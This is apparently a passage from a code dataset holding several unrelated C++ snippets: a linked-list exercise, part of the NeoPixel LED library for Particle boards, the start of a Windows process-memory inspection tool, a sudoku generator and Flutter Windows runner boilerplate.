key:47\r\nfound\r\n1.create\r\n2.insert\r\n3.inorder\r\n4.preorder\r\n5.postorder\r\n6.search\r\n7.minimum\r\n8.height\r\npress 0 to exit\r\nenter your choice:7\r\nminimum no. is:12\r\n1.create\r\n2.insert\r\n3.inorder\r\n4.preorder\r\n5.postorder\r\n6.search\r\n7.minimum\r\n8.height\r\npress 0 to exit\r\nenter your choice:8\r\nheight of tree: 4\r\n1.create\r\n2.insert\r\n3.inorder\r\n4.preorder\r\n5.postorder\r\n6.search\r\n7.minimum\r\n8.height\r\npress 0 to exit\r\nenter your choice:0\r\n\r\n",
    "#include <iostream>\nusing namespace std;\nstruct node\n{\n\tint data;\n\tnode* next;\n};\n\nnode* head = NULL;\nnode* current = NULL;\nnode* tail = NULL;\n\nvoid insert(int newdata)\n{\n\tcurrent = new node;\n\tcurrent->data = newdata;\n\tcurrent->next = NULL;\n\n\tif (head == NULL)\n\t{\n\t\thead = current;\n\t\ttail = current;\n\t}\n\telse\n\t{\n\t\ttail->next = current;\n\t\ttail = tail->next;\n\t}\n}\nvoid AddToHead(int newdata)\n{\n\tcurrent = new node;\n\tcurrent->data = newdata;\n\tcurrent->next = NULL;\n\tif (head == NULL)\n\t{\n\t\thead = current;\n\t\ttail = current;\n\t}\n\telse\n\t{\n\t\tcurrent->next = head;\n\t\thead = current;\n\t}\n}\nvoid deleteNode(int Deldata) {\n\tif (head != NULL)\n\t{\n\t\tcurrent = head;\n\t\tif (current->data == Deldata)\n\t\t{\n\t\t\thead = head->next;\n\t\t\tdelete current;\n\t\t}\n\t\telse\n\t\t{\n\t\t\twhile (current != NULL)\n\t\t\t{\n\t\t\t\tif ((current->next)->data == Deldata)\n\t\t\t\t{\n\t\t\t\t\t(current->next) = (current->next)->next;\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t\telse { current = current->next; }\n\t\t\t}\n\t\t}\n\t}\n\telse { cout << \"No Data Found\" << endl; }\n}\nvoid destoryList()\n{\n\tif (head != NULL)\n\t{\n\t\tcurrent = head;\n\t\twhile (current != NULL)\n\t\t{\n\t\t\thead = head->next;\n\t\t\tdelete current;\n\t\t\tcurrent = head;\n\t\t}\n\t\thead = NULL;\n\t\ttail = NULL;\n\t\tcout << \"The list is Destroyed Successfully\" << endl;\n\t}\n\telse\n\t{ cout << \"There is no list to be destroyed\" << endl; }\n}\nvoid display()\n{\n\tif (head != NULL)\n\t{\n\t\tcurrent = head;\n\t\tcout << \"Data:\" << endl;\n\t\twhile (current != NULL)\n\t\t{\n\t\t\tcout << current->data << endl;\n\t\t\tcurrent = current->next;\n\t\t}\n\t}\n\telse\n\t{ cout << \"No Data Found\" << endl; }\n}\n\nvoid app() {\n\t/*\n\t\top -> operation\n\t\tath -> add to head\n\t\tdn -> deleted node\n\t\tc -> confirm\n\t\tao -> another operation\n\t\ts -> starter app\n\t*/\n\tint op, ath, dn, c, ao, s;\n\n\tcout << \"--- Welcome to linked list implementation---\\n\";\n\tdo {\n\t\tcout << \"Choise what do you want\\n\";\n\t\tcout << \"Add to head -> (1)\\n\";\n\t\tcout << \"Delete node -> (2)\\n\";\n\t\tcout << \"Display -> (3)\\n\";\n\t\tcout << \"Destory list -> (4)\\n\";\n\t\tcout << \"Exit -> (5)\\n\";\n\t\tcin >> op;\n\t\tif (op == 1) {\n\t\t\tcout << \"Enter value do you want to add to head\\n\";\n\t\t\tcin >> ath;\n\t\t\tAddToHead(ath);\n\t\t\tdisplay();\n\t\t}\n\t\telse if (op == 2) {\n\t\t\tdisplay();\n\t\t\tcout << \"Choise the node \\n\";\n\t\t\tcin >> dn;\n\t\t\tcout << \"Are you sure to delete this node\\n\";\n\t\t\tcout << \"To Confirm Enter -> (1)\\n\";\n\t\t\tcout << \"To Cancel Enter -> any key\\n\";\n\t\t\tcin >> c;\n\t\t\tif (c == 1)\n\t\t\t{\n\t\t\t\tdeleteNode(dn);\n\t\t\t\tcout << \"\\nCheck data of list after deleting node : \\n \";\n\t\t\t\tdisplay();\n\t\t\t}\n\t\t\telse\n\t\t\t{\n\t\t\t\tcout << \"Delete is canceled\\n\";\n\t\t\t}\n\t\t}\n\t\telse if (op == 3) {\n\t\t\tcout << \"\\nThe Nodes of the Linked List are: \\n\";\n\t\t\tdisplay();\n\t\t}\n\t\telse if (op == 4) {\n\t\t\tdisplay();\n\t\t\tcout << \"\\nIF Destroyed the whole list\\n \\t The result will be: \\n\";\n\t\t\tcout << \"Are you sure to destroy the whole list\\n\";\n\t\t\tcout << \"To Confirm Enter -> (1)\\n\";\n\t\t\tcout << \"To Cancel Enter -> any key\\n\";\n\t\t\tcin >> c;\n\t\t\tif (c == 1)\n\t\t\t{\n\t\t\t\tdestoryList();\n\t\t\t\tcout << \"\\nCheck data of list after destroying : \\n \";\n\t\t\t\tdisplay();\n\t\t\t}\n\t\t\telse\n\t\t\t{\n\t\t\t\tcout << \"Destroy is canceled\\n\";\n\t\t\t}\n\t\t}\n\t\telse if (op == 5)\n\t\t{\n\t\t\treturn;\n\t\t}\n\t\telse { cout << \"Error in entry\\n\"; }\n\n\t\tcout << \"\\n\";\n\n\t\tcout << \"Do you want another opration\\n\";\n\t\tcout << \"Yes -> 1 \\n\";\n\t\tcout << \"NO -> any key \\n\";\n\t\tcin >> ao;\n\n\t} while (ao == 1);\n}\nint main()\n{\n\tapp();\n\treturn 0;\n}",
    "/*-------------------------------------------------------------------------\r\n  Particle Core, Particle Photon, P1, Electron, Argon, Boron, Xenon, B SoM, B5 SoM, E SoM X, P2, Photon 2, Tracker and\r\n  RedBear Duo library to control WS2811/WS2812/WS2813 based RGB LED\r\n  devices such as Adafruit NeoPixel strips.\r\n\r\n  Supports:\r\n  - 800 KHz WS2812, WS2812B, WS2813 and 400kHz bitstream and WS2811\r\n  - 800 KHz bitstream SK6812RGBW (NeoPixel RGBW pixel strips)\r\n    (use 'SK6812RGBW' as PIXEL_TYPE)\r\n\r\n  Also supports:\r\n  - Radio Shack Tri-Color Strip with TM1803 controller 400kHz bitstream.\r\n  - TM1829 pixels\r\n\r\n  PLEASE NOTE that the NeoPixels require 5V level inputs\r\n  and the supported microcontrollers only have 3.3V level outputs. Level\r\n  shifting is necessary, but will require a fast device such as one of\r\n  the following:\r\n\r\n  [SN74HCT125N]\r\n  http://www.digikey.com/product-detail/en/SN74HCT125N/296-8386-5-ND/376860\r\n\r\n  [SN74HCT245N]\r\n  http://www.digikey.com/product-detail/en/SN74HCT245N/296-1612-5-ND/277258\r\n\r\n  Written by Phil Burgess / Paint Your Dragon for Adafruit Industries.\r\n  Modified to work with Particle devices by Technobly.\r\n  Contributions by PJRC and other members of the open source community.\r\n\r\n  Adafruit invests time and resources providing this open source code,\r\n  please support Adafruit and open-source hardware by purchasing products\r\n  from Adafruit!\r\n  --------------------------------------------------------------------*/\r\n\r\n/* ======================= neopixel.cpp ======================= */\r\n/*-------------------------------------------------------------------------\r\n  This file is part of the Adafruit NeoPixel library.\r\n\r\n  NeoPixel is free software: you can redistribute it and/or modify\r\n  it under the terms of the GNU Lesser General Public License as\r\n  published by the Free Software Foundation, either version 3 of\r\n  the License, or (at your option) any later version.\r\n\r\n  NeoPixel is distributed in the hope that it will be useful,\r\n  but WITHOUT ANY WARRANTY; without even the implied warranty of\r\n  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\r\n  GNU Lesser General Public License for more details.\r\n\r\n  You should have received a copy of the GNU Lesser General Public\r\n  License along with NeoPixel.  If not, see\r\n  <http://www.gnu.org/licenses/>.\r\n  -------------------------------------------------------------------------*/\r\n\r\n#include \"neopixel.h\"\r\n\r\n#if PLATFORM_ID == 0 // Core (0)\r\n  #define pinLO(_pin) (PIN_MAP[_pin].gpio_peripheral->BRR = PIN_MAP[_pin].gpio_pin)\r\n  #define pinHI(_pin) (PIN_MAP[_pin].gpio_peripheral->BSRR = PIN_MAP[_pin].gpio_pin)\r\n#elif (PLATFORM_ID == 6) || (PLATFORM_ID == 8) || (PLATFORM_ID == 10) || (PLATFORM_ID == 88) // Photon (6), P1 (8), Electron (10) or Redbear Duo (88)\r\n#if SYSTEM_VERSION < SYSTEM_VERSION_ALPHA(5,0,0,2)\r\n  STM32_Pin_Info* PIN_MAP2 = HAL_Pin_Map(); // Pointer required for highest access speed\r\n#else\r\n  STM32_Pin_Info* PIN_MAP2 = hal_pin_map(); // Pointer required for highest access speed\r\n#endif // SYSTEM_VERSION < SYSTEM_VERSION_ALPHA(5,0,0,2)\r\n  #define pinLO(_pin) (PIN_MAP2[_pin].gpio_peripheral->BSRRH = PIN_MAP2[_pin].gpio_pin)\r\n  #define pinHI(_pin) (PIN_MAP2[_pin].gpio_peripheral->BSRRL = PIN_MAP2[_pin].gpio_pin)\r\n#elif HAL_PLATFORM_NRF52840 // Argon, Boron, Xenon, B SoM, B5 SoM, E SoM X, Tracker\r\n  #include \"nrf.h\"\r\n  #include \"nrf_gpio.h\"\r\n  #include \"pinmap_impl.h\"\r\n#if SYSTEM_VERSION < SYSTEM_VERSION_ALPHA(5,0,0,2)\r\n  NRF5x_Pin_Info* PIN_MAP2 = HAL_Pin_Map();\r\n#else\r\n  NRF5x_Pin_Info* PIN_MAP2 = hal_pin_map();\r\n#endif // SYSTEM_VERSION < SYSTEM_VERSION_ALPHA(5,0,0,2)\r\n  #define pinLO(_pin) (nrf_gpio_pin_clear(NRF_GPIO_PIN_MAP(PIN_MAP2[_pin].gpio_port, PIN_MAP2[_pin].gpio_pin)))\r\n  #define pinHI(_pin) (nrf_gpio_pin_set(NRF_GPIO_PIN_MAP(PIN_MAP2[_pin].gpio_port, PIN_MAP2[_pin].gpio_pin)))\r\n#elif (PLATFORM_ID == 32) // HAL_PLATFORM_RTL872X\r\n  // nothing extra needed for P2\r\n#else\r\n  #error \"*** PLATFORM_ID not supported by this library. PLATFORM should be Particle Core, Photon, Electron, Argon, Boron, Xenon, RedBear Duo, B SoM, B5 SoM, E SoM X, Tracker or P2 ***\"\r\n#endif\r\n// fast pin access\r\n#define pinSet(_pin, _hilo) (_hilo ? pinHI(_pin) : pinLO(_pin))\r\n\r\n#if (PLATFORM_ID == 32)\r\nAdafruit_NeoPixel::Adafruit_NeoPixel(uint16_t n, SPIClass& spi, uint8_t t) :\r\n  begun(false), type(t), brightness(0), pixels(NULL), endTime(0)\r\n{\r\n  updateLength(n);\r\n  spi_ = &spi;\r\n}\r\n#else\r\nAdafruit_NeoPixel::Adafruit_NeoPixel(uint16_t n, uint8_t p, uint8_t t) :\r\n  begun(false), type(t), brightness(0), pixels(NULL), endTime(0)\r\n{\r\n  updateLength(n);\r\n  setPin(p);\r\n}\r\n\r\n#endif // #if (PLATFORM_ID == 32)\r\n\r\nAdafruit_NeoPixel::~Adafruit_NeoPixel() {\r\n  if (pixels) free(pixels);\r\n#if (PLATFORM_ID == 32)\r\n  spi_->end();\r\n#else\r\n  if (begun) pinMode(pin, INPUT);\r\n#endif\r\n}\r\n\r\nuint8_t Adafruit_NeoPixel::getPin() const {\r\n    return pin;\r\n}\r\n\r\nuint8_t Adafruit_NeoPixel::getType() const {\r\n    return type;\r\n}\r\n\r\nvoid Adafruit_NeoPixel::update",
    "#include <iostream>\r\n#include <cassert>\r\n#include <cstdlib>\r\n#include <Windows.h>\r\n#include <Psapi.h>\r\n#include <tlhelp32.h>\r\n\r\n#define MAX_STR_SIZE 192\r\n#define MAX_MODULE_AMOUNT 128\r\n#define MAX_MEM_AMOUNT 10000\r\n\r\n#define MAX_MODULE_AMOUNT_IN_BYTES MAX_MODULE_AMOUNT * sizeof(HMODULE)\r\n\r\n#undef min\r\n#undef Process32First\r\n#undef Process32Next\r\n#undef PROCESSENTRY32\r\n\r\nUCHAR strcmp_leastchar(const char* a, const char* b, const char* la = nullptr)\r\n{\r\n\tconst char* lb = b;\r\n\r\n\tif (la == nullptr)\r\n\t{\r\n\t\tla = a;\r\n\t\twhile (*la) la++;\r\n\t}\r\n\r\n\twhile (*lb) lb++;\r\n\r\n\tint min_size = -std::min(la - a, lb - b);\r\n\tUCHAR c = 0;\r\n\r\n\tfor (int i = -1; i >= min_size; i--)\r\n\t\tc += (la[i] == lb[i]);\r\n\r\n\treturn c;\r\n}\r\n\r\nstd::string GetLastErrorAsString()\r\n{\r\n\t//Get the error message ID, if any.\r\n\tDWORD errorMessageID = ::GetLastError();\r\n\tif (errorMessageID == 0) {\r\n\t\treturn std::string(); //No error message has been recorded\r\n\t}\r\n\r\n\tLPSTR messageBuffer = nullptr;\r\n\r\n\t//Ask Win32 to give us the string version of that message ID.\r\n\t//The parameters we pass in, tell Win32 to create the buffer that holds the message for us (because we don't yet know how long the message string will be).\r\n\tsize_t size = FormatMessageA(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,\r\n\t\tNULL, errorMessageID, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), (LPSTR)&messageBuffer, 0, NULL);\r\n\r\n\t//Copy the error message into a std::string.\r\n\tstd::string message(messageBuffer, size);\r\n\r\n\t//Free the Win32's string's buffer.\r\n\tLocalFree(messageBuffer);\r\n\r\n\treturn message;\r\n}\r\n\r\nstruct mem_info_s\r\n{\r\n\tvoid* BaseAddress;\r\n\tSIZE_T RegionSize;\r\n\tbool is_priorited;\r\n};\r\n\r\nsize_t app_mem_size = 0;\r\n\r\nstruct info_s\r\n{\r\n\tbool alive;\r\n\r\n\tDWORD pId, module_amount, error_code;\r\n\tHMODULE* modules;\r\n\tMODULEINFO* module_infos;\r\n\r\n\tsize_t buck_mem_size;\r\n\r\n\tHMODULE main_module;\r\n\tvoid* module_base;\r\n\tMODULEINFO main_module_info;\r\n\tLPSTR main_module_file_name;\r\n\r\n\tmem_info_s* mem_addresses;\r\n\tDWORD mem_amount;\r\n\r\n\tHANDLE proc;\r\n\r\n\tinfo_s(DWORD pId_In) : pId(pId_In)\r\n\t{\r\n\t\tmodule_infos = nullptr;\r\n\t\tmem_addresses = nullptr;\r\n\t\tmem_amount = 0;\r\n\t\talive = false;\r\n\t\tmain_module = 0;\r\n\t\tmain_module_info = { nullptr, 0, nullptr };\r\n\t\tmodule_amount = error_code = 0;\r\n\t\tmodules = nullptr;\r\n\t\tproc = nullptr;\r\n\r\n\t\tmain_module_file_name = (LPSTR)malloc(MAX_STR_SIZE);\r\n\t\tLPSTR cache_file_name = (LPSTR)malloc(MAX_STR_SIZE);\r\n\r\n\t\tif (main_module_file_name == nullptr || cache_file_name == nullptr) {\r\n\t\t\terror_code = 1;\r\n\t\t\treturn;\r\n\t\t}\r\n\r\n\t\tmain_module_file_name[MAX_STR_SIZE - 1] = '\\0';\r\n\t\tcache_file_name[MAX_STR_SIZE - 1] = '\\0';\r\n\r\n\t\tmodules = (HMODULE*)malloc(MAX_MODULE_AMOUNT_IN_BYTES);\r\n\t\tmodule_infos = (MODULEINFO*)malloc(MAX_MODULE_AMOUNT * sizeof(MODULEINFO));\r\n\r\n\t\tif (modules == nullptr || module_infos == nullptr) {\r\n\t\t\terror_code = 2;\r\n\t\t\treturn;\r\n\t\t}\r\n\r\n\t\tproc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pId_In);\r\n\r\n\t\tGetProcessImageFileNameA(proc, main_module_file_name, MAX_STR_SIZE);\r\n\r\n\t\tEnumProcessModules(proc, modules, MAX_MODULE_AMOUNT_IN_BYTES, &module_amount);\r\n\r\n\t\tif (module_amount > MAX_MODULE_AMOUNT_IN_BYTES) {\r\n\t\t\terror_code = 3;\r\n\t\t\treturn;\r\n\t\t}\r\n\r\n\t\tmodule_amount /= sizeof(HMODULE);\r\n\r\n\t\tconst char* least_char_on_main = main_module_file_name;\r\n\t\twhile (*least_char_on_main) least_char_on_main++;\r\n\r\n\t\tMODULEINFO module_info;\r\n\r\n\t\tfor (DWORD i = 0; i < module_amount; i++)\r\n\t\t{\r\n\t\t\tDWORD err = GetModuleFileNameA(modules[i], cache_file_name, MAX_STR_SIZE);\r\n\t\t\tGetModuleInformation(proc, modules[i], &module_info, sizeof(MODULEINFO));\r\n\t\t\tmodule_infos[i] = module_info;\r\n\r\n\t\t\tif (err == 0)\r\n\t\t\t{\r\n\t\t\t\tcache_file_name[0] = '?';\r\n\t\t\t\tcache_file_name[1] = '\\0';\r\n\t\t\t}\r\n\r\n\t\t\tstd::cout << i << \":\\t\" << module_info.lpBaseOfDll << \": \" << cache_file_name << '\\n';\r\n\t\t}\r\n\r\n\t\tmain_module_info = module_infos[0];\r\n\t\tmain_module = modules[0];\r\n\r\n\t\tmodule_base = (void*)main_module;\r\n\r\n\t\tfree(cache_file_name);\r\n\r\n\t\tstd::cout << \"\\nModule Name:\\t\" << main_module_file_name\r\n\t\t\t<< \"\\nModule Base:\\t0x\" << module_base\r\n\t\t\t<< \"\\nCum Base:\\t0x\" << main_module_info.EntryPoint\r\n\t\t\t<< \"\\nModule Size:\\t\" << main_module_info.SizeOfImage\r\n\t\t\t<< \"\\nModule Amount:\\t\" << module_amount\r\n\t\t\t<< \"\\npId:\\t\\t\" << pId\r\n\t\t\t<< std::endl;\r\n\r\n\t\talive = true;\r\n\t}\r\n\r\n\tvoid get_memory_infos()\r\n\t{\r\n\t\tif (alive == false)\r\n\t\t\treturn;\r\n\r\n\t\tif (mem_addresses == nullptr)\r\n\t\t\tmem_addresses = (mem_info_s*)malloc(MAX_MEM_AMOUNT * sizeof(mem_info_s));\r\n\r\n\t\tbuck_mem_size = 0;\r\n\t\tmem_amount = 0;\r\n\r\n\t\tMEMORY_BASIC_INFORMATION mem_info;\r\n\t\tvoid* next_scan_start = nullptr;\r\n\r\n\t\twhile (VirtualQueryEx(proc, next_scan_start, &mem_info, sizeof(MEMORY_BASIC_INFORMATION)))\r\n\t\t{\r\n\t\t\tnext_scan_start = (char*)mem_info.BaseAddress + mem_info.RegionSize;\r\n\r\n\t\t\tif (mem_info.State == MEM_COMMIT && next_scan_start < (void*)0x00007FF000000000)\r\n\t\t\t{\r\n\t\t\t\tif (mem_info.RegionSize > app_mem_size)\r\n\t\t\t\t\tbuck_mem_size++;\r\n\t\t\t\telse\r\n\t\t\t\t{\r\n\t\t\t\t\tmem_addresses[mem_amount].is_priorited = (mem_info.BaseAddress == mem_i",
    "#include <iostream>\n#include <cmath>\n#include <cstdlib>\n#include <ctime>\n#include <vector>\nusing namespace std;\n\nconst int STANDARD_SIZE = 9;\nconst int GIGANT_SIZE = 16;\nconst char VALUES[16] = {'1', '2', '3', '4', '5', '6', '7', '8', '9', 'A', 'B', 'C', 'D', 'E', 'F', 'G'};\n\nvoid horizontal(vector<vector<char>>& sudokuTable, const int PUZZLE_SIZE) {\n    //borders could be written without this loops AS WELL :)\n    string horizont = (PUZZLE_SIZE == 16) ? \"====\" : \"===\";\n    if(PUZZLE_SIZE == 16) {//nuthin special, for beauty\n        for(int i = 0; i < PUZZLE_SIZE - 6; i++)\n            cout << horizont;\n        cout << \"==\" << endl;\n    }\n    else {\n        for(int i = 0; i < PUZZLE_SIZE; i++)\n            cout << horizont;\n        cout << endl;\n    }\n}\n\nvoid draw(vector<vector<char>>& sudokuTable, const int PUZZLE_SIZE) {\n\n    const string sides = \"||\";\n    int cntHorizontal = (PUZZLE_SIZE == 16) ? 3 : 2;\n    int cntVertical = (PUZZLE_SIZE == 16) ? 3 : 2;\n    const int grid = cntHorizontal;\n\n    for(int i = 0; i < PUZZLE_SIZE; i++) {\n        if(cntHorizontal == grid) {\n            horizontal(sudokuTable, PUZZLE_SIZE);\n            cntHorizontal = 0;\n        } else {\n            cntHorizontal++;\n        }\n\n        int cntVertical = grid;\n        for(int j = 0; j < PUZZLE_SIZE; j++) {\n            if(cntVertical == grid) {\n                cout << sides;\n                cntVertical = 0;\n            } else cntVertical ++;\n\n            cout << sudokuTable[i][j] << \" \";\n\n            if(j == 8 && grid == 2) cout << sides;\n            if(j == 15 && grid == 3) cout << sides;\n        }\n        cout << endl;\n\n        if(i == 8 && grid == 2) horizontal(sudokuTable, PUZZLE_SIZE);\n        if(i == 15 && grid == 3) horizontal(sudokuTable, PUZZLE_SIZE);\n    }\n}\n\n\nbool isValid(int rowz, int col, int val, vector<vector<char>>& sudokuTable, const int PUZZLE_SIZE) {\n    // Checking val existence on a column/row\n    for(int c =  0; c < PUZZLE_SIZE; c++)  \n        if(sudokuTable[rowz][c] == val) return false;\n\n    for(int r = 0; r < PUZZLE_SIZE; r++)  \n        if(sudokuTable[r][col] == val) return false;\n\n    int grid = 3;\n    if(PUZZLE_SIZE == 16) grid = 4;\n\n    int gridRow = floor(rowz /  grid) *  grid, gridCol = floor(col /  grid) *  grid;\n\n    for(int r = gridRow; r < gridRow +  grid; r++) {\n        for(int c = gridCol; c < gridCol +  grid; c++) {\n            if(sudokuTable[r][c] == val) return false;\n        }\n    }\n\n    return true;\n}\n\nbool startGame(int rowz, int col, vector<vector<char>>& sudokuTable,  const int PUZZLE_SIZE) {\n\n    if(rowz == PUZZLE_SIZE - 1 && col == PUZZLE_SIZE) \n        return true;\n\n    if(col == PUZZLE_SIZE) {\n        col = 0;\n        rowz++;\n    }\n\n    if(sudokuTable[rowz][col] > '0') return startGame(rowz, col + 1, sudokuTable, PUZZLE_SIZE);\n    \n    for(int i = 0; i < PUZZLE_SIZE; i++) {\n        if(isValid(rowz,col, VALUES[i], sudokuTable, PUZZLE_SIZE)) {\n            sudokuTable[rowz][col] = VALUES[i];\n             if(startGame(rowz, col + 1, sudokuTable, PUZZLE_SIZE)) {\n                return true;\n             }\n        }\n\n        sudokuTable[rowz][col] = '0';\n    }\n\n    return false;\n}\n\nint getRandomNumber(int min, int max) {\n    return rand() % (max - min) + min;\n}\n\nint getRandomNumber(const int PUZZLE_SIZE) {\n    return (rand() % PUZZLE_SIZE);\n}\n\nvoid toChar(char *c, int digit ) {\n    switch (digit) {\n        case 10:\n            *c = 'A';\n            break;\n        case 11:\n            *c = 'B';\n            break;\n        case 12:\n            *c = 'C';\n            break;\n        case 13:\n            *c = 'D';\n            break;\n        case 14:\n            *c = 'E';\n            break;\n        case 15:\n            *c = 'F';\n            break;\n        case 16:\n            *c = 'G';\n            break;\n        \n        default:\n            break;\n    }\n}\n\nvoid generatePuzzle(int level, vector<vector<char>>& sudokuTable, const int  PUZZLE_SIZE) {\n    int emptyCell = pow(PUZZLE_SIZE, 2) - level;\n    cout << \"Count empty cell \" << emptyCell << endl; //Extra !!!\n\n    while(emptyCell > 0) {\n        int randomRow, randomColumn, digit;\n        randomRow = getRandomNumber(PUZZLE_SIZE);\n        randomColumn = getRandomNumber(PUZZLE_SIZE);\n        digit = getRandomNumber(PUZZLE_SIZE) + 1;\n\n        char c;\n        if(digit < 10) c = char(digit + 48);\n        else {\n            toChar(&c, digit);\n        }\n\n        if(sudokuTable[randomRow][randomColumn] == '0') {\n            bool valid = false;\n            while(!valid) {\n                if(sudokuTable[randomRow][randomColumn] != '0') {\n                    sudokuTable[randomRow][randomColumn] = '0';\n                    valid = true;\n\n                    // cout << \"Row \" << randomRow << '\\t' << randomColumn << '\\t' << digit << endl;\n                }\n\n                randomRow = getRandomNumber(PUZZLE_SIZE);\n                randomColumn = getRandomNumber(PUZZLE_SIZE);\n                digit = getRandomNumber(PUZZLE_SIZE);\n            }\n\n        }\n        else {",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"drumrider\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
